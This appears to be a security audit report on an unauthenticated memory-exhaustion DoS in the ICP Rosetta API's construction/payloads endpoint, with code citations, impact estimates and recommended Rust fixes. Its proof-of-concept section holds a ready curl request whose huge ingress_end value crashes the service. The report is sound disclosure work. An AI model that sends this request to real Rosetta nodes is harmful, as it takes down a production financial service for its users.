Audit Report

## Title
Unbounded `ingress_expiries` Vec Allocation via Attacker-Controlled `ingress_end`/`ingress_start` Causes OOM DoS — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary
The `construction_payloads` handler in the ICP Rosetta API accepts attacker-controlled `ingress_start` and `ingress_end` values from request metadata and feeds them directly into an unbounded `while` loop that grows a `Vec<u64>`. No cap or validation on the window size exists. A single unauthenticated HTTP POST with maximally-spread values causes the Rosetta process to attempt tens of gigabytes of heap allocation, triggering OOM and crashing the service.

## Finding Description
`interval` is computed as a fixed 120 seconds (120,000,000,000 ns): [1](#0-0) 

`ingress_start` and `ingress_end` are read directly from request metadata with no bounds check: [2](#0-1) 

These values are fed into an unbounded loop with no iteration cap: [3](#0-2) 

The resulting `ingress_expiries` slice is then passed to `add_payloads`, which allocates **two** `SigningPayload` structs per expiry per transaction: [4](#0-3) 

The 4 MB JSON body limit on the server is irrelevant — the malicious payload is tiny (two `u64` fields); all allocation happens server-side after parsing: [5](#0-4) 

There are no existing guards: no check that `ingress_end > ingress_start`, no maximum window size, and no iteration count cap anywhere in the handler.

## Impact Explanation
With `ingress_end − ingress_start = u64::MAX / 2 ≈ 9.22 × 10¹⁸ ns`, the loop runs ~76.8 million iterations. The `ingress_expiries` Vec alone consumes ~614 MB; `add_payloads` then allocates ~2 `SigningPayload` objects (~200 bytes each) per iteration per transaction, totaling ~30 GB for a single-operation request. The Rosetta process is killed by the OS OOM killer. This is a complete, unauthenticated denial of service of the ICP Rosetta API — a production financial integration component — matching the **High** bounty impact: *"Application/platform-level DoS, crash... or subnet availability impact not based on raw volumetric DDoS"* and *"Significant... Rosetta... security impact with concrete user or protocol harm."*

## Likelihood Explanation
No authentication is required for `POST /construction/payloads`. The attacker only needs to set two numeric JSON fields. The exploit is deterministic, reproducible with a single request, and requires no special privileges, victim interaction, or network-level attack. No rate limiting or per-request memory accounting exists for this endpoint.

## Recommendation
Add a hard cap on the ingress window before the loop:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60);
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request("ingress window exceeds maximum allowed duration"));
}
```

Or cap iterations directly inside the loop:

```rust
const MAX_INGRESS_EXPIRIES: usize = 1000;
if ingress_expiries.len() >= MAX_INGRESS_EXPIRIES {
    return Err(ApiError::invalid_request("too many ingress expiries requested"));
}
```

The ICRC1 Rosetta construction API should be audited for the same pattern.

## Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"abc"},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"0000000000000000000000000000000000000000000000000000000000000001","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 9223372036854775807
    }
  }'
```

Monitor with `watch -n0.1 'cat /proc/<pid>/status | grep VmRSS'` — RSS grows rapidly to available RAM and the process is killed. A unit test can confirm the OOM path by asserting that a request with `ingress_end = u64::MAX / 2` returns an error rather than attempting allocation.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L1055-1075)
```rust
    for ingress_expiry in ingress_expiries {
        let mut update = update.clone();
        update.ingress_expiry = *ingress_expiry;
        let message_id = update.id();
        let transaction_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(transaction_payload);
        let read_state = make_read_state_from_update(&update);
        let read_state_message_id = MessageId::from(read_state.representation_independent_hash());
        let read_state_payload = SigningPayload {
            address: None,
            account_identifier: Some(account_identifier.clone()),
            hex_bytes: hex::encode(make_sig_data(&read_state_message_id)),
            signature_type: Some(signature_type),
        };
        payloads.push(read_state_payload);
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L297-298)
```rust
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
```
